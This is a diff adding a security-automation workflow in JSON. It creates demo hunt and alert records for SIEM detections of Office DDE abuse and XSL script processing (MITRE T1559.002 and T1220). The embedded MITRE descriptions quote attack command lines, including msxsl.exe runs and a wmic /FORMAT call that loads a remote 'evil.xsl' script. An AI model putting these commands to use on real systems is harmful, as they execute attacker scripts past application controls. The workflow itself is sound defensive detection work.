@@ -1,0 +1,336 @@
+{
+    "@type": "Workflow",
+    "triggerLimit": null,
+    "name": "Generates Alerts for Process Execution",
+    "aliasName": null,
+    "tag": null,
+    "description": "Demonstrates threat hunting scenario for the attacks using MITRE technique Process Execution and generates demo Hunt, Alert and Technique\/Sub-Technique records for the same",
+    "isActive": true,
+    "debug": false,
+    "singleRecordExecution": false,
+    "remoteExecutableFlag": false,
+    "parameters": [],
+    "synchronous": false,
+    "lastModifyDate": 1644164607,
+    "collection": "\/api\/3\/workflow_collections\/897f9d35-4fcb-4933-92d4-d2ef8c1f7478",
+    "versions": [],
+    "triggerStep": "\/api\/3\/workflow_steps\/ee3b545b-1780-410a-a98c-035c1e555a44",
+    "steps": [
+        {
+            "@type": "WorkflowStep",
+            "name": "Start",
+            "description": null,
+            "arguments": {
+                "step_variables": {
+                    "input": {
+                        "params": []
+                    }
+                }
+            },
+            "status": null,
+            "top": "30",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/b348f017-9a94-471f-87f8-ce88b6a7ad62",
+            "uuid": "ee3b545b-1780-410a-a98c-035c1e555a44",
+            "id": 4679
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Configuration",
+            "description": null,
+            "arguments": {
+                "scenarioTitle": "{{vars.input.records[0].title}}",
+                "useMockOutput": "{{globalVars.Demo_mode}}"
+            },
+            "status": null,
+            "top": "165",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "6777c53e-a5f5-47ff-ae49-c8dc6814a948",
+            "id": 4680
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Alert from SIEM",
+            "description": null,
+            "arguments": {
+                "arguments": {
+                    "huntEnd": "{{vars.steps.Get_Hunt_Time_Range.input.huntEndDate}}",
+                    "huntStart": "{{vars.steps.Get_Hunt_Time_Range.input.huntStartDate}}"
+                },
+                "apply_async": false,
+                "step_variables": [],
+                "workflowReference": "\/api\/3\/workflows\/bc55a2ca-3274-4363-94a0-528394e32c2a"
+            },
+            "status": null,
+            "top": "570",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/74932bdc-b8b6-4d24-88c4-1a4dfbc524f3",
+            "uuid": "d3fffa7e-7977-440a-a75c-b9353244c63a",
+            "id": 4681
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Created Alert Data",
+            "description": null,
+            "arguments": {
+                "@id": "{{((vars.steps.Create_and_Link_Alert | json_query('[].alert_data.\"@id\"')) | union([vars.steps.Create_Hunt_Record['@id']]) | union(vars.steps.Create_and_Link_Alert | json_query('[].technique_data'))) | flatten(levels=1) }}"
+            },
+            "status": null,
+            "top": "840",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "1c2ce378-f9ef-49d8-a7a4-501602c45e7b",
+            "id": 4682
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Hunt Time Range",
+            "description": null,
+            "arguments": {
+                "type": "InputBased",
+                "input": {
+                    "schema": {
+                        "title": "Enter Hunt Time Range",
+                        "description": "Hunt Time Range",
+                        "inputVariables": [
+                            {
+                                "name": "huntStartDate",
+                                "type": "integer",
+                                "label": "Hunt Start Date",
+                                "title": "Date\/Time Field",
+                                "usable": true,
+                                "tooltip": "",
+                                "dataType": "datetime",
+                                "formType": "datetime",
+                                "required": true,
+                                "_expanded": true,
+                                "mmdUpdate": true,
+                                "collection": false,
+                                "searchable": true,
+                                "templateUrl": "app\/components\/form\/fields\/datetime.html",
+                                "defaultValue": {
+                                    "differenceType": "months",
+                                    "differenceValue": -1
+                                },
+                                "_previousName": "untStartDate",
+                                "lengthConstraint": false,
+                                "allowedEncryption": false,
+                                "allowedGridColumn": true,
+                                "useRecordFieldDefault": false
+                            },
+                            {
+                                "name": "huntEndDate",
+                                "type": "integer",
+                                "label": "Hunt End Date",
+                                "title": "Date\/Time Field",
+                                "usable": true,
+                                "tooltip": "",
+                                "dataType": "datetime",
+                                "formType": "datetime",
+                                "required": true,
+                                "_expanded": true,
+                                "mmdUpdate": true,
+                                "collection": false,
+                                "searchable": true,
+                                "templateUrl": "app\/components\/form\/fields\/datetime.html",
+                                "defaultValue": {
+                                    "differenceType": "mins",
+                                    "differenceValue": 1
+                                },
+                                "_previousName": "huntStartDate",
+                                "lengthConstraint": false,
+                                "allowedEncryption": false,
+                                "allowedGridColumn": true,
+                                "useRecordFieldDefault": false
+                            }
+                        ]
+                    }
+                },
+                "record": "{{vars.input.records[0]['@id']}}",
+                "resources": "scenario",
+                "owner_detail": {
+                    "isAssigned": false
+                },
+                "step_variables": [],
+                "response_mapping": {
+                    "options": [
+                        {
+                            "option": "Submit",
+                            "primary": true,
+                            "step_iri": "\/api\/3\/workflow_steps\/41346a0a-81be-465b-ad4a-0babee72ec9c"
+                        }
+                    ],
+                    "duplicateOption": false
+                },
+                "email_notification": {
+                    "enabled": false,
+                    "smtpParameters": []
+                }
+            },
+            "status": null,
+            "top": "300",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/fc04082a-d7dc-4299-96fb-6837b1baa0fe",
+            "uuid": "b3bb9a3a-36f4-4963-8283-82b5f1daa794",
+            "id": 4683
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create and Link Alert",
+            "description": null,
+            "arguments": {
+                "for_each": {
+                    "item": "{{vars.steps.Get_Alert_from_SIEM.step_output}}",
+                    "parallel": false,
+                    "condition": ""
+                },
+                "arguments": {
+                    "MD5": "{{ (vars.item._source.event_data.Hashes.split(\"MD5=\")[1].split(',')[0])}}",
+                    "url": "",
+                    "source": "{{vars.item._source.source_name}}",
+                    "comment": "{% if 'dynamicdataexchange' in vars.item._index %}SIEM query identified a Microsoft Office product using Dynamic Data Exchange to spawn non-standard process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.computer_name}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'msxsl' in vars.item._source.image_path %}SIEM query identified XSL script execution via process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% else %}SIEM query identified an XSL script in the command line, leading to spawning of child process {{vars.item._source.image_path.split(\"\\\\\")[-1]}} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% endif %}",
+                    "huntIRI": "{{vars.steps.Create_Hunt_Record['@id']}}",
+                    "service": "",
+                    "filePath": "{{vars.item._source.image_path}}",
+                    "hostName": "{{vars.item._source.beat.hostname}}",
+                    "sourceIP": "",
+                    "userName": "{{vars.item._source.username}}",
+                    "alertName": "{% if 'dynamicdataexchange' in vars.item._index %}ATT&CK-Dynamic Data Exchange-{{vars.item._source.image_path.split(\"\\\\\")[-1] }} spawned{% elif 'msxsl' in vars.item._source.image_path %}ATT&CK-XSL Script Processing-MSXSL{% else %}ATT&CK-XSL Script Processing-Child Process-{{vars.item._source.image_path.split(\"\\\\\")[-1] }}{% endif %}",
+                    "alertType": "{% if 'dynamicdataexchange' in vars.item._index %}{{\"AlertType\" | picklist(\"Inter-Process Communication\", \"@id\")}}{% elif 'msxsl' in vars.item._source.image_path %}{{\"AlertType\" | picklist(\"XSL Script Processing\", \"@id\")}}{% else %}{{\"AlertType\" | picklist(\"XSL Script Processing\", \"@id\")}}{% endif %}",
+                    "epochTime": "{{ arrow.get(vars.item._source.event_data.UtcTime).timestamp }}",
+                    "eventName": "",
+                    "eventTime": "{{ vars.item._source.event_data.UtcTime}}",
+                    "processID": "{{vars.item._source.event_data.ProcessId}}",
+                    "technique": "{% if 'dynamicdataexchange' in vars.item._index %}Dynamic Data Exchange{% elif 'msxsl' in vars.item._source.image_path %}XSL Script Processing (MSXSL or similar){% else %}XSL Script Processing (Process Spawned){% endif %}",
+                    "sourceData": "{{vars.item}}",
+                    "sourceTool": "{{vars.item._source.source_name}}",
+                    "commandline": "{{vars.item._source.event_data.CommandLine}}",
+                    "description": "{% if 'dynamicdataexchange' in vars.item._index %}A non-standard process was spawned by a Microsoft Office product. Macros, dynamic data exchange, and other techniques may be used to cause Office products to execute other processes. In many networks, an instance of a host's instance of Microsoft Office spawning other processes is uncommon and should investigated for additional signs of compromise.{% elif 'msxsl' in vars.item._source.image_path %}An attempt to invoke an XSL script from the command line was observed. XSL can be used to execute arbitrary code via trusted binary execution. Use of this technique may bypass application whitelisting and allow an attacker to bypass other defenses. Attention should be paid to the commands passed  as well as processes spawned.{% else %}An attempt to invoke an XSL script from the command line resulting in the spawning of a child process was observed. XSL scripts can be used to execute arbitrary code via trusted binary execution. Use of this technique may bypass application whitelisting and allow an attacker to bypass other defenses. Attention should be paid to the commands passed as well as processes spawned.{% endif %}",
+                    "processGUID": "{{vars.item._source.event_data.ProcessGuid}}",
+                    "processName": "{{vars.item._source.image_path.split(\"\\\\\")[-1] }}",
+                    "registryKey": "",
+                    "sourceImage": "{{ vars.item._source.event_data.SourceImage | replace( \"\\\\\", \"\\\\\\\\\" )}}",
+                    "targetImage": "{{ vars.item._source.event_data.TargetImage | replace( \"\\\\\", \"\\\\\\\\\" )}}",
+                    "computerName": "{{vars.item._source.computer_name}}",
+                    "destinationIP": "",
+                    "mitre_tech_id": "{% if 'dynamicdataexchange' in vars.item._index %}T1559.002{% elif 'msxsl' in vars.item._source.image_path %}T1220{% else %}T1220{% endif %}",
+                    "parentProcess": "{{vars.item._source.parent_image_path}}",
+                    "scheduledTask": "",
+                    "bitstransferid": "",
+                    "parentProcessID": "{{vars.item._source.event_data.ParentProcessId}}",
+                    "bytestransferred": "",
+                    "registryKeyValue": "",
+                    "parentCommandLine": "{{vars.item._source.event_data.ParentCommandLine}}",
+                    "decodedCommandLine": "",
+                    "mitreTechniqueData": "{% if 'dynamicdataexchange' in vars.item._index %}{\n    \"id\": 164,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/232a7e42-cd6e-4902-8fe9-2960f529dd4d\",\n    \"name\": \"Dynamic Data Exchange\",\n    \"uuid\": \"232a7e42-cd6e-4902-8fe9-2960f529dd4d\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1581516650,\n    \"mitreId\": \"T1559.002\",\n    \"myNotes\": null,\n    \"version\": \"1.1\",\n    \"detection\": \"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\\n\\nOLE and Office Open XML files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Module: Module Load, Process: Process Creation, Script: Script Execution\",\n    \"description\": \"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and\/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\\n\\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https:\/\/attack.mitre.org\/techniques\/T1559\/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\\n\\nMicrosoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https:\/\/attack.mitre.org\/techniques\/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https:\/\/attack.mitre.org\/techniques\/T1059). DDE execution can be invoked remotely via [Remote Services](https:\/\/attack.mitre.org\/techniques\/T1021) such as [Distributed Component Object Model](https:\/\/attack.mitre.org\/techniques\/T1021\/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\",\n    \"lastModified\": 1627339924,\n    \"parentTechnique\": {\n      \"id\": 226,\n      \"@id\": \"\/api\/3\/mitre_techniques\/acd0ba37-7ba9-4cc5-ac61-796586cd856d\",\n      \"name\": \"Inter-Process Communication\",\n      \"uuid\": \"acd0ba37-7ba9-4cc5-ac61-796586cd856d\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1581516528,\n      \"mitreId\": \"T1559\",\n      \"version\": \"1.1\",\n      \"detection\": \"Monitor for strings in files\/commands, loaded DLLs\/libraries, or spawned processes that are associated with abuse of IPC mechanisms.\",\n      \"platforms\": \"Windows, macOS\",\n      \"recordTags\": [],\n      \"dataSources\": \"Module: Module Load, Process: Process Creation, Script: Script Execution\",\n      \"description\": \"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \\n\\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages\/libraries or native interfaces such as Windows [Dynamic Data Exchange](https:\/\/attack.mitre.org\/techniques\/T1559\/002) or [Component Object Model](https:\/\/attack.mitre.org\/techniques\/T1559\/001). Higher level execution mediums, such as those of [Command and Scripting Interpreter](https:\/\/attack.mitre.org\/techniques\/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https:\/\/attack.mitre.org\/techniques\/T1021) such as [Distributed Component Object Model](https:\/\/attack.mitre.org\/techniques\/T1021\/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)\",\n      \"lastModified\": 1634327310,\n      \"permissionsRequired\": \"Administrator, User, SYSTEM\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'msxsl' in vars.item._source.image_path %}{\n    \"id\": 287,\n    \"@id\": \"\/api\/3\/mitre_techniques\/ebbe170d-aa74-4946-8511-9921243415a3\",\n    \"name\": \"XSL Script Processing\",\n    \"uuid\": \"ebbe170d-aa74-4946-8511-9921243415a3\",\n    \"@type\": \"Technique\",\n    \"notes\": null,\n    \"capecId\": null,\n    \"created\": 1539735260,\n    \"mitreId\": \"T1220\",\n    \"version\": \"1.2\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\\n\\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, Module: Module Load\",\n    \"description\": \"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\\n\\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https:\/\/attack.mitre.org\/techniques\/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML\/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\\n\\n* <code>msxsl.exe customers[.]xml script[.]xsl<\/code>\\n* <code>msxsl.exe script[.]xsl script[.]xsl<\/code>\\n* <code>msxsl.exe script[.]jpeg script[.]jpeg<\/code>\\n\\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local\/remote scripts and, similar to its [Regsvr32](https:\/\/attack.mitre.org\/techniques\/T1218\/010)\/ \\\"Squiblydoo\\\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) provided they utilize the \/FORMAT switch.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\\n\\n* Local File: <code>wmic process list \/FORMAT:evil[.]xsl<\/code>\\n* Remote File: <code>wmic os get \/FORMAT:\u201dhttps[:]\/\/example[.]com\/evil[.]xsl\u201d<\/code>\",\n    \"lastModified\": 1612883220,\n    \"permissionsRequired\": \"User\"\n  }{% else %}{\n    \"id\": 287,\n    \"@id\": \"\/api\/3\/mitre_techniques\/ebbe170d-aa74-4946-8511-9921243415a3\",\n    \"name\": \"XSL Script Processing\",\n    \"uuid\": \"ebbe170d-aa74-4946-8511-9921243415a3\",\n    \"@type\": \"Technique\",\n    \"notes\": null,\n    \"capecId\": null,\n    \"created\": 1539735260,\n    \"mitreId\": \"T1220\",\n    \"version\": \"1.2\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\\n\\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, Module: Module Load\",\n    \"description\": \"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\\n\\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https:\/\/attack.mitre.org\/techniques\/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML\/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\\n\\n* <code>msxsl.exe customers[.]xml script[.]xsl<\/code>\\n* <code>msxsl.exe script[.]xsl script[.]xsl<\/code>\\n* <code>msxsl.exe script[.]jpeg script[.]jpeg<\/code>\\n\\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local\/remote scripts and, similar to its [Regsvr32](https:\/\/attack.mitre.org\/techniques\/T1218\/010)\/ \\\"Squiblydoo\\\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) provided they utilize the \/FORMAT switch.(Citation: XSL Bypass Mar 2019)\\n\\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\\n\\n* Local File: <code>wmic process list \/FORMAT:evil[.]xsl<\/code>\\n* Remote File: <code>wmic os get \/FORMAT:\u201dhttps[:]\/\/example[.]com\/evil[.]xsl\u201d<\/code>\",\n    \"lastModified\": 1612883220,\n    \"permissionsRequired\": \"User\"\n  }{% endif %}"
+                },
+                "apply_async": false,
+                "step_variables": [],
+                "workflowReference": "\/api\/3\/workflows\/8f61e7f7-955b-4a81-947e-be12568e66b8"
+            },
+            "status": null,
+            "top": "705",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/74932bdc-b8b6-4d24-88c4-1a4dfbc524f3",
+            "uuid": "2392bfd8-1bcb-461c-8b5c-4789d0ca1daf",
+            "id": 4684
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create Hunt Record",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "name": "Demo Hunt - {{vars.scenarioTitle}}",
+                    "huntEnd": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntEndDate).int_timestamp}}",
+                    "__replace": "",
+                    "huntStart": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntStartDate).int_timestamp}}",
+                    "timeCreated": "{{arrow.utcnow().int_timestamp}}"
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/hunt",
+                "__recommend": [],
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "435",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "41346a0a-81be-465b-ad4a-0babee72ec9c",
+            "id": 4685
+        }
+    ],
+    "routes": [
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Alerts from Elastic -> Get Created Alert Data",
+            "targetStep": "\/api\/3\/workflow_steps\/1c2ce378-f9ef-49d8-a7a4-501602c45e7b",
+            "sourceStep": "\/api\/3\/workflow_steps\/2392bfd8-1bcb-461c-8b5c-4789d0ca1daf",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "9fe5f030-c2d9-4079-bee7-83301ae4e1ea"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Start -> Configuration",
+            "targetStep": "\/api\/3\/workflow_steps\/6777c53e-a5f5-47ff-ae49-c8dc6814a948",
+            "sourceStep": "\/api\/3\/workflow_steps\/ee3b545b-1780-410a-a98c-035c1e555a44",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "21b7866a-5e58-4613-bcb2-2d5ffde4fb4d"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Configuration -> Get Hunt Time Range",
+            "targetStep": "\/api\/3\/workflow_steps\/b3bb9a3a-36f4-4963-8283-82b5f1daa794",
+            "sourceStep": "\/api\/3\/workflow_steps\/6777c53e-a5f5-47ff-ae49-c8dc6814a948",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "f826536b-d053-4fdb-8124-e11a62d31c75"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Hunt Record -> Get Alert from SIEM",
+            "targetStep": "\/api\/3\/workflow_steps\/d3fffa7e-7977-440a-a75c-b9353244c63a",
+            "sourceStep": "\/api\/3\/workflow_steps\/41346a0a-81be-465b-ad4a-0babee72ec9c",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "121b8fc7-6f78-4c8a-bd1a-8ae2f3102d20"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Hunt Time Range -> Create Hunt Record",
+            "targetStep": "\/api\/3\/workflow_steps\/41346a0a-81be-465b-ad4a-0babee72ec9c",
+            "sourceStep": "\/api\/3\/workflow_steps\/b3bb9a3a-36f4-4963-8283-82b5f1daa794",
+            "label": "Submit",
+            "isExecuted": false,
+            "uuid": "618e78bf-6198-44c5-a36f-ccd681b7b387"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Alert from SIEM -> Create and Link Alert",
+            "targetStep": "\/api\/3\/workflow_steps\/2392bfd8-1bcb-461c-8b5c-4789d0ca1daf",
+            "sourceStep": "\/api\/3\/workflow_steps\/d3fffa7e-7977-440a-a75c-b9353244c63a",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "0e393ac0-a593-4b1a-a4aa-aba02e967863"
+        }
+    ],
+    "priority": "\/api\/3\/picklists\/2b563c61-ae2c-41c0-a85a-c9709585e3f2",
+    "uuid": "d60e6432-c181-4e54-8a74-3a034001c2f7",
+    "recordTags": [
+        "Referenced"
+    ],
+    "id": 1138,
+    "createUser": "\/api\/3\/people\/3451141c-bac6-467c-8d72-85e0fab569ce",
+    "createDate": 1644164613,
+    "modifyUser": "\/api\/3\/people\/3451141c-bac6-467c-8d72-85e0fab569ce",
+    "modifyDate": 1644164613,
+    "owners": [],
+    "isPrivate": false
+}
